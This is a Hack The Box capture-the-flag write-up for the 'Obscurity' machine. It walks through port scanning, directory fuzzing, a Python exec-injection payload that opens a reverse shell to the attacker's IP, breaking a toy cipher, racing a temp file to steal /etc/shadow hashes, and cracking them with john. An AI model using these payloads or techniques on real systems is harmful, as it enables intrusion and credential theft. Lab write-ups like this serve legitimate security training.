---
date: 2020-05-16 19:31:02
layout: post
title: "Obscurity"
subtitle: Hackthebox
description: Medium box from Hackthebox
image: /writeup/assets/img/obscurity.png
optimized_image:
category:
tags:
author:
paginate: false
---

Let's Start with the basic nmap scan to look for open ports with these commands.
```bash
nmap -T4 -p 0-1000 10.10.10.168
```
```bash
nmap -T4 -p 1000-10000 10.10.10.168
```
```bash
nmap -T4 -p 10000- 10.10.10.168
```

This provides with 2 open ports 22 and 8080.Let's scan them for more info,
```bash
nmap -T4 -p 22,8080 -A 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 01:00 IST
Nmap scan report for 10.10.10.168
Host is up (0.26s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
8080/tcp open  http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 16 May 2020 19:33:28
|     Server: BadHTTPServer
|     Last-Modified: Sat, 16 May 2020 19:33:28
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 16 May 2020 19:33:29
|     Server: BadHTTPServer
|     Last-Modified: Sat, 16 May 2020 19:33:29
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   277.48 ms 10.10.14.1
2   277.54 ms 10.10.10.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.19 seconds
```
This doesn't provides any interesting info.
Looking the website hosted at port 8080 gives a interesting information about a supersecureserver.py file which is located in a secret directory.
![placeholder](/writeup/assets/img/obscurity/supersecure.png "script")

Fuzzing for the file with wfuzz,
```bash
wfuzz -w /root/DirectoryfUZZ/directories --sc 200,301,302 -t 40 http://obscure.htb:8080/FUZZ/SuperSecureServer.py
```
![placeholder](/writeup/assets/img/obscurity/wfuzz.png "wfuzz")
Got a directory named develop;visiting  /develop/supersecureserver.py gives a python script that is being used by the server to handle requests.
Looking through the script a line of code inside the ***ServeDoc*** function looks appealing, 
![placeholder](/writeup/assets/img/obscurity/script.png "script")
The path variable goes through the exec function,this can be used to perform remote code execution.
The following payload exploits this line of code
```bash
Payload='; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']); #
```
URL Encoding the payload and then putting it in url gives a reverse shell.
```url
http://10.10.10.168:8080/%27%3B%20s%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2710%2E10%2E14%2E10%27%2C7777%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%27%2Fbin%2Fsh%27%2C%27%2Di%27%5D%29%3B%20%23  
```
Got reverse shell of www-data
![placeholder](/writeup/assets/img/obscurity/shell.png "shell")
Found a user robert on the machine.
Inside the home directory of robert user found few files  SuperSecureCrypt.py, out.txt, check.txt, passwordreminder.txt
check.txt stated that if it is encrypted with the user's key then out.txt will be created.
```python
#SuperSecureCrypt.py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```            
After analyzing the SuperSecureCrypt.py , created a python script to get the user's key.

```python
import sys

with open("/root/Machines/Obscurity/decrypt/check", 'r', encoding='UTF-8') as clear:
     text = clear.read()
with open("/root/Machines/Obscurity/decrypt/out.txt", 'r', encoding='UTF-8') as f:
     enc = f.read()
print("Getting the Key....")
pool="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_"
key=""
for x, y in zip(text,enc):
     for char in pool:
        newChr = ord(x)
        newChr = ((newChr + ord(char)) % 255)
        oldchr=  ord(y)
        if(newChr==oldchr):
           key+=char 
           print(key)
           continue
        
print(key)
```
 ![placeholder](/writeup/assets/img/obscurity/brute.png "key")
 
 **KEY=alexandrovich**
 
 Used the extracted key with the SuperSecureCrypt.py to decrypt the passwordreminder.txt
 
 Found the password for the robert user.
 
 **robert:SecThruObsFTW**
 
 Got the user.txt
 
 Inside the robert's home directory a directory BetterSSH was containing a python script BetterSSH.py
 ***sudo -l*** shows that we can run this BetterSSH.py with root privileges.
```python
*
*
*
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
*
*
*
```
This script was reading the shadow file and then writing it in the /tmp/SSH ,eventually it also deleted it.
Used this script to get the file from /tmp/SSH as soon as it is created.
```python
import os

while True:
   if(os.listdir("/tmp/SSH/") == []):
      print("NotFound")
   else:
      os.system("cp /tmp/SSH/* /tmp/Pass/")
      print("Found...Exiting")
      exit(0)
```
Ran this script and then ran the BetterSSH.py in another window.Got the password hashes.
Using ***john*** decrypted the hashes to get the password for root
```bash
john --wordlist=rockyou.txt hash
```
**root:mercedes**        
 Logged in and got the root.txt
 

## Thoughts
 This box was totally unique with it's approach.Creating the exploits yourself was fun.
